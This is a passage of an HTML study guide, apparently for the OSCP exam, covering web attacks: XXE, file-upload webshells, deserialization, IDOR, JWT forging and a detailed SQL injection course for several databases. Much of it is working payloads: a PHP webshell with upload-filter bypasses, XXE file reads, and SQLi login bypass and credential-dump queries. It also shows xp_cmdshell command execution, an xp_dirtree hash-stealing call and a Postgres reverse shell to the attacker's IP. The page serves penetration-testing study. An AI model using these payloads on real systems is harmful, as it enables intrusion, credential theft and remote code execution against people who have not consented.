+<p><strong>What it is:</strong> if the app parses XML you send, you can define an &quot;entity&quot; that pulls in a local file and echoes it back.</p>
+<p><strong>How to spot it:</strong> the app accepts XML — SOAP APIs, <code>.xml</code> uploads, SAML, <code>Content-Type: application/xml</code>, even DOCX/SVG (they&#x27;re XML inside).</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;   &lt;!-- define entity x = contents of /etc/passwd --&gt;
+&lt;root&gt;&lt;name&gt;&amp;x;&lt;/name&gt;&lt;/root&gt;                            &lt;!-- &amp;x; gets replaced by the file&#x27;s contents --&gt;</code></pre>
+<p><strong>Variations:</strong> blind/out-of-band (use an external DTD to exfiltrate data), SSRF via XXE, PHP <code>expect://</code> for RCE, base64 filter to read source.</p>
+<p><strong>Where it leads:</strong> file read → creds/keys → foothold.</p>
+<h2 id="v4-[web-upload]-malicious-file-upload-[found-upload]">[WEB-UPLOAD]  Malicious File Upload  → <code class="tag">[FOUND-UPLOAD]</code><a class="anchor" href="#v4-[web-upload]-malicious-file-upload-[found-upload]">#</a></h2>
+<p><strong>What it is:</strong> an upload form (avatar, document, image). Goal: upload an executable script (webshell) into a folder the web server will *run*, then visit it.</p>
+<p><strong>How to spot it:</strong> any upload feature.</p>
+<pre><code># 1) Upload shell.php containing:   &lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;
+#    Find where it landed (brute /uploads /images), then visit:  http://$IP/uploads/shell.php?c=id
+# 2) If .php is blocked, try alternative executable extensions:
+shell.php3   shell.php5   shell.phtml   shell.pht   shell.phar
+shell.php.jpg    shell.pHp    shell.php%00.jpg           # double extension / mixed case / null byte
+# Other filter bypasses: set Content-Type: image/png (but PHP in the body); prepend GIF89a magic bytes;
+#   upload a .htaccess to make the server treat a new extension as PHP
+# IIS servers → try .asp/.aspx/.config ;  Tomcat → .jsp, or deploy a .war</code></pre>
+<p><strong>Troubleshoot:</strong> find the served path (brute <code>/uploads/</code>, check the response&#x27;s Location header); confirm it *executes* with a test <code>&lt;?php echo 7*7;?&gt;</code> (should print 49, not the raw text).</p>
+<p><strong>Where it leads:</strong> webshell → reverse shell → <code class="tag">[LINUX-PRIVESC-QUICK]</code> / <code class="tag">[WINDOWS-PRIVESC-QUICK]</code>.</p>
+<h2 id="v4-[web-deserialize]-insecure-deserialization">[WEB-DESERIALIZE]  Insecure Deserialization<a class="anchor" href="#v4-[web-deserialize]-insecure-deserialization">#</a></h2>
+<p><strong>What it is:</strong> apps sometimes store objects as encoded blobs (in cookies/params) and rebuild (&quot;deserialize&quot;) them on the server. A crafted blob can trick the server into running code.</p>
+<p><strong>How to spot it:</strong> blob-like cookies/params — PHP <code>O:8:&quot;...&quot;</code>, Java <code>rO0AB</code> (or hex <code>AC ED 00 05</code>), .NET <code>AAEAAAD…</code>, Python pickle.</p>
+<p><strong>Exploit:</strong> PHP → craft an object / &quot;POP chain&quot; (needs the source); Java → <code>ysoserial</code>; .NET → <code>ysoserial.net</code>; PHP gadget chains → <code>phpggc</code> (<code class="tag">[PARITY2-WEB-EXTRA]</code>).</p>
+<p><strong>If it fails:</strong> get the source first (via LFI/git). ⚠️ Usually a <strong>rabbit hole without source</strong> → see <code>[COMMON-RABBIT-HOLES web]</code>.</p>
+<p><strong>Where it leads:</strong> code execution → shell.</p>
+<h2 id="v4-[web-idor]-insecure-direct-object-reference-access-data-that-isnt-yours">[WEB-IDOR]  Insecure Direct Object Reference — access data that isn&#x27;t yours<a class="anchor" href="#v4-[web-idor]-insecure-direct-object-reference-access-data-that-isnt-yours">#</a></h2>
+<p><strong>What it is:</strong> the app uses guessable IDs (<code>?id=123</code>, <code>/user/5</code>) and forgets to check you&#x27;re allowed to see them. Change the number → see someone else&#x27;s data.</p>
+<p><strong>How to spot it:</strong> sequential IDs in URLs or requests.</p>
+<p><strong>Test:</strong> change the ID; visit admin-only routes directly; flip a <code>role</code>/<code>isAdmin</code> field in the request.</p>
+<p><strong>Where it leads:</strong> other users&#x27; / admin data → creds, or privileged features (upload/exec).</p>
+<h2 id="v4-[web-jwt]-json-web-tokens-forge-your-own-login-token">[WEB-JWT]  JSON Web Tokens — forge your own login token<a class="anchor" href="#v4-[web-jwt]-json-web-tokens-forge-your-own-login-token">#</a></h2>
+<p><strong>What it is:</strong> a JWT is a signed token proving who you are (<code>header.payload.signature</code>, three base64 chunks joined by dots). If the signing secret is weak or checking is broken, you can forge an admin token.</p>
+<p><strong>How to spot it:</strong> <code>Authorization: Bearer eyJ...</code>, or a cookie with three base64 parts split by dots.</p>
+<pre><code>hashcat -m 16500 jwt.txt rockyou.txt   # crack a weak signing secret → then re-sign the token with role=admin
+python3 jwt_tool.py &lt;JWT&gt; -T           # interactive tamper/forge tool   [PARITY2-WEB-EXTRA]</code></pre>
+<p><strong>Common attacks:</strong> <code>alg:none</code> (drop the signature), weak HMAC secret (crack + re-sign), <code>kid</code>/<code>jku</code> injection, RS256→HS256 confusion (sign with the public key as the HMAC secret).</p>
+<p><strong>Where it leads:</strong> forged admin token → privileged access.</p>
+<h2 id="v4-[web-authbypass]-ways-to-get-past-a-login">[WEB-AUTHBYPASS]  ways to get past a login<a class="anchor" href="#v4-[web-authbypass]-ways-to-get-past-a-login">#</a></h2>
+<p>SQLi auth bypass (<code class="tag">[SQLI]</code>) · default/weak creds · password-reset token flaws · &quot;forced browsing&quot; straight to an authenticated page · cookie/<code>role</code> tampering · JWT forging (<code class="tag">[WEB-JWT]</code>) · HTTP verb tampering · 403-bypass tricks (<code class="tag">[WEB-403-BYPASS]</code>) · 2FA bypass.</p>
+<h2 id="v4-[web-xss]-cross-site-scripting-rarely-the-oscp-path-just-recognise-it">[WEB-XSS]  Cross-Site Scripting  (rarely the OSCP path — just recognise it)<a class="anchor" href="#v4-[web-xss]-cross-site-scripting-rarely-the-oscp-path-just-recognise-it">#</a></h2>
+<p>Reflected/stored/DOM XSS runs your JavaScript in a victim&#x27;s browser. <strong>Low value on OSCP</strong> because there&#x27;s usually no real victim to attack — unless the box simulates an admin who visits pages. Test with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>; only useful for session theft/CSRF when a victim exists.</p>
+<h2 id="v4-[common-rabbit-holes-web]-where-beginners-waste-hours">[COMMON-RABBIT-HOLES web]  — where beginners waste hours<a class="anchor" href="#v4-[common-rabbit-holes-web]-where-beginners-waste-hours">#</a></h2>
+<ul>
+<li>Endless directory-brute with giant wordlists → use a *medium* list, go recursive, then move on.</li>
+<li>Chasing XSS on a box with no victim.</li>
+<li>Deserialization/XXE without the source code → get source first, or skip.</li>
+<li>Fuzzing one parameter forever → map the *whole* app instead.</li>
+<li>Chasing a CVE that needs a login you don&#x27;t have.</li>
+</ul>
+<hr>
+<h1 id="v4-[sqli]-sql-injection-attacking-the-database-mini-course">[SQLI]  SQL INJECTION — attacking the database (mini-course)<a class="anchor" href="#v4-[sqli]-sql-injection-attacking-the-database-mini-course">#</a></h1>
+<blockquote><strong>What is SQL injection?</strong> Websites store data in a database and ask it questions using SQL. If the site drops your input straight into that question, you can rewrite the question — to log in without a password, or to dump every user&#x27;s password hash. This section teaches it from scratch.</blockquote>
+<h2 id="v4-[sqli-quick]-the-core-moves-one-screen">[SQLI-QUICK]  the core moves  (one screen)<a class="anchor" href="#v4-[sqli-quick]-the-core-moves-one-screen">#</a></h2>
+<pre><code>DETECT:   type a single quote  &#x27;  (or &quot;)  → does the page error or behave differently? then it may be injectable
+          confirm:  &#x27; OR 1=1-- -   (always true)   vs   &#x27; AND 1=2-- -   (always false)
+COUNT:    &#x27; ORDER BY 1-- -   then 2, 3, …   → keep going until it errors = number of columns
+UNION:    &#x27; UNION SELECT 1,2,3-- -          → see which numbers print on the page (those are your &quot;output slots&quot;)
+IDENTIFY: put version()/@@version into a printing slot → learn which database it is
+BLIND:    page changes for  &#x27; AND 1=1-- -  but not  &#x27; AND 1=2-- -   → &quot;boolean blind&quot;
+          nothing shows but  &#x27; AND SLEEP(5)-- -  delays the reply → &quot;time blind&quot;
+LOGIN BYPASS:  put   &#x27; OR 1=1-- -   in the username field</code></pre>
+<blockquote>**<code>-- -</code>** is a SQL comment — it tells the database to ignore the rest of the original query (the trailing space after <code>--</code> matters). MySQL also accepts <code>#</code>.</blockquote>
+<h2 id="v4-[sqli-decision-tree]-which-technique-do-i-use">[SQLI-DECISION-TREE]  which technique do I use?<a class="anchor" href="#v4-[sqli-decision-tree]-which-technique-do-i-use">#</a></h2>
+<pre><code>1. Injectable?  Type &#x27;  → error or changed page = yes.
+2. Does the page SHOW query results or errors?
+   YES, results show   → count columns (ORDER BY) → UNION SELECT → read data directly   (fastest)
+   YES, error text shows → error-based extraction (data leaks inside the error message)
+   NO output, but page changes on true/false → BOOLEAN blind (extract one character at a time)
+   NO change at all      → TIME-based blind (use SLEEP/WAITFOR to read data by delay)
+3. Identify the database (MySQL? MSSQL? Postgres?) → use THAT database&#x27;s syntax below.
+4. Enumerate: list databases → tables → columns → dump the creds.
+5. Escalate: can you read/write files or run OS commands? (depends on the database)</code></pre>
+<h2 id="v4-[sqli-detect]-proving-its-injectable">[SQLI-DETECT]  proving it&#x27;s injectable<a class="anchor" href="#v4-[sqli-detect]-proving-its-injectable">#</a></h2>
+<ul>
+<li>Break the query: <code>&#x27;</code>, <code>&quot;</code>, <code>)</code>, <code>&#x27;;</code>. Watch for a SQL error, a 500, a blank page, or different content.</li>
+<li>Confirm you control the logic: <code>&#x27; AND 1=1-- -</code> (page normal) vs <code>&#x27; AND 1=2-- -</code> (page changes/empties) → injectable and controllable.</li>
+<li>Numeric fields (no quotes needed): <code>1 AND 1=1</code> vs <code>1 AND 1=2</code>.</li>
+<li>Comment styles to try: <code>-- -</code> (note the trailing space), <code>#</code> (MySQL), <code>/*...*/</code>, <code>;--</code>.</li>
+<li><strong>Login bypass:</strong> username <code>admin&#x27;-- -</code> (logs in as admin, ignoring the password check) or <code>&#x27; OR 1=1 LIMIT 1-- -</code>.</li>
+</ul>
+<h2 id="v4-[sqli-union]-union-based-extraction-when-results-are-shown">[SQLI-UNION]  union-based extraction (when results are shown)<a class="anchor" href="#v4-[sqli-union]-union-based-extraction-when-results-are-shown">#</a></h2>
+<ol>
+<li><strong>Count the columns:</strong> <code>&#x27; ORDER BY 1-- -</code>, then <code>2</code>, <code>3</code>… until it errors. The last number that worked = the column count. (Alternative: <code>&#x27; UNION SELECT NULL-- -</code>, add <code>NULL</code>s until no error.)</li>
+<li><strong>Find the printing columns:</strong> <code>&#x27; UNION SELECT 1,2,3-- -</code> → note which numbers actually appear on the page. Those slots are where your stolen data will show.</li>
+<li><strong>Identify the database:</strong> put <code>@@version</code> / <code>version()</code> into a printing slot.</li>
+<li><strong>Extract data:</strong> replace a printing number with your data query (see the per-database sections).</li>
+<li><strong>Data types don&#x27;t match / errors?</strong> Use <code>NULL</code> for columns you&#x27;re not using, or wrap values in a cast-to-text.</li>
+</ol>
+<h2 id="v4-[sqli-blind]-boolean-time-based-when-nothing-is-shown">[SQLI-BLIND]  boolean &amp; time-based (when nothing is shown)<a class="anchor" href="#v4-[sqli-blind]-boolean-time-based-when-nothing-is-shown">#</a></h2>
+<ul>
+<li><strong>Boolean blind:</strong> ask true/false questions and read the answer from whether the page changes. Example — is the first letter of the password an &#x27;a&#x27;?</li>
+</ul>
+<p>  <code>&#x27; AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=&#x27;a&#x27;-- -</code> → page &quot;true&quot; or &quot;false&quot;. Repeat for each character. <strong>Automate this</strong> (a short Python script).</p>
+<ul>
+<li><strong>Time blind:</strong> same idea, but the &quot;yes&quot; is a delay:</li>
+</ul>
+<p>  <code>&#x27; AND IF(1=1,SLEEP(5),0)-- -</code> (MySQL) · <code>&#x27;; IF(1=1) WAITFOR DELAY &#x27;0:0:5&#x27;-- -</code> (MSSQL) · <code>&#x27; AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -</code> (Postgres).</p>
+<ul>
+<li>Blind is painfully slow by hand → sqlmap would automate it, <strong>but sqlmap is BANNED on the exam</strong> (<code class="tag">[SQLI-SQLMAP]</code>). Write a small script to loop the characters instead.</li>
+</ul>
+<hr>
+<h2 id="v4-[sqli-mysql]-mysql-mariadb">[SQLI-MYSQL]  MySQL / MariaDB<a class="anchor" href="#v4-[sqli-mysql]-mysql-mariadb">#</a></h2>
+<ul>
+<li><strong>Identify:</strong> <code>@@version</code> / <code>version()</code>; comment <code>#</code>; <code>database()</code>, <code>current_user()</code>; errors say &quot;You have an error in your SQL syntax&quot;.</li>
+<li><strong>Count columns:</strong> <code>&#x27; ORDER BY N-- -</code> or <code>&#x27; UNION SELECT NULL,NULL-- -</code>.</li>
+<li><strong>Enumerate</strong> (MySQL keeps a catalogue of its own structure in <code>information_schema</code>):</li>
+</ul>
+<pre><code>-- list databases:
+&#x27; UNION SELECT schema_name,2 FROM information_schema.schemata-- -
+-- list tables in the current database:
+&#x27; UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+-- list columns in the &#x27;users&#x27; table:
+&#x27; UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name=&#x27;users&#x27;-- -
+-- dump usernames:passwords (0x3a is a &#x27;:&#x27; separator):
+&#x27; UNION SELECT concat(user,0x3a,password),2 FROM users-- -</code></pre>
+<p>(Wrap in <code>group_concat(...)</code> to pull many rows into one cell.)</p>
+<ul>
+<li><strong>File read/write (RCE):</strong> with the <code>FILE</code> privilege → read <code>&#x27; UNION SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;),2-- -</code>; write a webshell <code>... INTO OUTFILE &#x27;/var/www/html/sh.php&#x27;</code> (needs <code>secure_file_priv</code> empty and a writable path). UDF RCE if the plugin dir is writable <code class="tag">[LOOK-UP]</code>.</li>
+<li><strong>Creds:</strong> dump the app&#x27;s <code>users</code> table → hashes → crack with <code>hashcat</code> or reuse.</li>
+</ul>
+<h2 id="v4-[sqli-mssql]-microsoft-sql-server-also-[enum-mssql]">[SQLI-MSSQL]  Microsoft SQL Server  → also <code class="tag">[ENUM-MSSQL]</code><a class="anchor" href="#v4-[sqli-mssql]-microsoft-sql-server-also-[enum-mssql]">#</a></h2>
+<ul>
+<li><strong>Identify:</strong> <code>@@version</code>, <code>SELECT @@servername</code>; comment <code>--</code>; string join is <code>+</code>; <code>WAITFOR DELAY</code> exists.</li>
+<li><strong>Enumerate:</strong></li>
+</ul>
+<pre><code>&#x27; UNION SELECT name,2 FROM master..sysdatabases-- -                                   -- databases
+&#x27; UNION SELECT table_name,2 FROM information_schema.tables-- -                          -- tables
+&#x27; UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name=&#x27;users&#x27;-- -  -- columns
+&#x27; UNION SELECT @@version,2-- -                                                          -- version</code></pre>
+<ul>
+<li><strong>Error-based (when UNION won&#x27;t show):</strong> <code>&#x27; AND 1=CONVERT(int,(SELECT @@version))-- -</code> — the data leaks inside the type-conversion error.</li>
+<li><strong>Command execution (the payoff)</strong> — turn on <code>xp_cmdshell</code> and run OS commands:</li>
+</ul>
+<pre><code>&#x27;; EXEC sp_configure &#x27;show advanced options&#x27;,1; RECONFIGURE; EXEC sp_configure &#x27;xp_cmdshell&#x27;,1; RECONFIGURE;-- -
+&#x27;; EXEC xp_cmdshell &#x27;whoami&#x27;;-- -</code></pre>
+<ul>
+<li><strong>Steal a hash:</strong> <code>&#x27;; EXEC xp_dirtree &#x27;\\&lt;yourKaliIP&gt;\x&#x27;;-- -</code> → catch it on Responder. Stacked queries (<code>;</code>) usually work here.</li>
+<li>Impersonation / linked servers → lateral movement (see <code class="tag">[ENUM-MSSQL]</code>).</li>
+</ul>
+<h2 id="v4-[sqli-postgres]-postgresql-also-[enum-postgres]">[SQLI-POSTGRES]  PostgreSQL  → also <code class="tag">[ENUM-POSTGRES]</code><a class="anchor" href="#v4-[sqli-postgres]-postgresql-also-[enum-postgres]">#</a></h2>
+<ul>
+<li><strong>Identify:</strong> <code>version()</code>; string join is <code>||</code>; comment <code>--</code>; cast errors mention &quot;pg&quot;.</li>
+<li><strong>Enumerate:</strong></li>
+</ul>
+<pre><code>&#x27; UNION SELECT table_name,2 FROM information_schema.tables-- -
+&#x27; UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name=&#x27;users&#x27;-- -</code></pre>
+<ul>
+<li><strong>Command execution:</strong> <code>COPY (SELECT &#x27;&#x27;) TO PROGRAM &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;yourKaliIP&gt;/443 0&gt;&amp;1&quot;&#x27;;</code> (needs superuser, v9.3+). <strong>File read:</strong> <code>CREATE TABLE t(x text); COPY t FROM &#x27;/etc/passwd&#x27;; SELECT x FROM t;</code>.</li>
+<li><strong>Time blind:</strong> <code>&#x27; AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -</code>.</li>
+</ul>
+<h2 id="v4-[sqli-sqlite]-sqlite">[SQLI-SQLITE]  SQLite<a class="anchor" href="#v4-[sqli-sqlite]-sqlite">#</a></h2>
+<ul>
+<li><strong>Identify:</strong> <code>sqlite_version()</code>; there&#x27;s no <code>information_schema</code>.</li>
+<li><strong>Enumerate:</strong></li>
+</ul>
+<pre><code>&#x27; UNION SELECT name,2 FROM sqlite_master WHERE type=&#x27;table&#x27;-- -                       -- tables
+&#x27; UNION SELECT sql,2 FROM sqlite_master WHERE type=&#x27;table&#x27; AND name=&#x27;users&#x27;-- -        -- table&#x27;s schema</code></pre>
+<ul>
+<li>No <code>xp_cmdshell</code>; RCE only via an ATTACH-write-to-webroot in specific apps <code class="tag">[LOOK-UP]</code>. Mostly used to dump creds.</li>
+</ul>
+<h2 id="v4-[sqli-sqlmap]-banned-on-the-exam-practicelearning-only">[SQLI-SQLMAP]  (⛔ BANNED on the exam — practice/learning only)<a class="anchor" href="#v4-[sqli-sqlmap]-banned-on-the-exam-practicelearning-only">#</a></h2>
+<pre><code>sqlmap -r req.txt --batch                     # feed it a saved Burp request (best accuracy)
+sqlmap -u &#x27;http://$IP/p?id=1&#x27; --batch --dbs   # auto-detect + list databases
+sqlmap -u &#x27;...&#x27; -D appdb --tables ; --dump -T users
+sqlmap -r req.txt --os-shell                   # try for a shell if file/exec is possible</code></pre>
+<p>Useful flags: <code>--level 5 --risk 3</code> (dig deeper), <code>--technique=BEUST</code>, <code>--tamper=space2comment</code> (evade a filter), <code>-p param</code>, <code>--threads 5</code>.</p>
+<p><strong>⛔ EXAM RULE:</strong> sqlmap is an *automatic-exploitation* tool and is <strong>banned</strong> (<code class="tag">[EXAM-RULES-2026]</code>). Use it only in <strong>practice</strong> to learn what manual injection should look like. On the exam, do <strong>all</strong> SQLi by hand using the sections above.</p>
+<h2 id="v4-[sqli-troubleshooting]">[SQLI-TROUBLESHOOTING]<a class="anchor" href="#v4-[sqli-troubleshooting]">#</a></h2>
+<div class="tablewrap"><table><thead><tr><th>What you see</th><th>Meaning / fix</th></tr></thead><tbody>
+<tr><td>No error, no change</td><td>maybe not injectable, or fully blind → try time-based</td></tr>
+<tr><td>UNION: &quot;different number of columns&quot;</td><td>wrong column count → recount with ORDER BY</td></tr>
+<tr><td>UNION runs but no data shows</td><td>your data landed in a non-printing column → move it to a printing slot; cast to text</td></tr>
+<tr><td>Quotes are filtered</td><td>use <code>CHAR()</code> or <code>0x</code> hex encoding, or a numeric field</td></tr>
+<tr><td>Spaces are filtered</td><td><code>/**/</code>, <code>%09</code> (tab), <code>+</code>, or parentheses</td></tr>
+<tr><td>Keywords filtered (a WAF)</td><td>change case, or inline comments: <code>UNI/**/ON</code></td></tr>
+<tr><td><code>-- -</code> doesn&#x27;t work</td><td>try <code>#</code>, <code>-- </code> (space), <code>/*...*/</code>, or <code>;%00</code></td></tr>
+<tr><td>Works in Burp but not the browser</td><td>it&#x27;s URL-encoding — encode the payload; use Burp Repeater</td></tr>
+</tbody></table></div>
+<p><strong>If SQLi fails entirely:</strong> double-check the input really goes to a database (it might be LFI or command injection instead); test other parameters; check the POST body, headers, and cookies for injection too.</p>
+<p><strong>After SQLi:</strong> dump creds → <code class="tag">[FOUND-CREDS]</code> and spray them; MSSQL/Postgres → RCE → <code class="tag">[SHELL-QUICK]</code>; MySQL FILE priv → webshell.</p>
+<hr>
+<p>*End Volume 2. Next: Volume 3 — turning a bug into a real shell, moving files, and cracking the credentials you find.*</p></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
